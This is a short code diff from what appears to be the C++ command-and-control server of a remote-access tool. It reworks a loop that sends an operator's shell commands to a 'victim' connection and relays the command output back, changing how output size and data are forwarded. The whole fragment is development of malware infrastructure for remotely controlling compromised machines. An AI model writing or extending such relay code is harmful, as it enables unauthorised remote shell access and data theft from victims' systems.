@@ -107,17 +107,18 @@ public:
                 logger::debug("Shell Command From Operator: [{}]", cmd);
                 vic->sendline(cmd);
 
-                const auto output_size = std::atol(trim_string(vic->recvline()).c_str());
+                // forward output size
+                const auto output_size = trim_string(vic->recvline());
                 logger::debug("Output Size: [{}]", output_size);
+                op->sendline(output_size);
 
-                if (output_size > 0) {
-                    const auto output = trim_string(vic->recv(output_size));
+                // forward output data
+                const auto out_size = std::atol(output_size.c_str());
+                if (out_size > 0) {
+                    const auto output = trim_string(vic->recv(out_size));
                     logger::debug("Output from Victim: [{}]", output);
-                    op->sendline(output + "_MLVX_END");
-                } else {
-                    op->sendline("MLVX_NODATA_MLVX_END");
+                    op->send(output);
                 }
-
                 std::this_thread::sleep_for(std::chrono::milliseconds(5));
             }
             logger::warn("Bridge closed: One or both parties disconnected.");
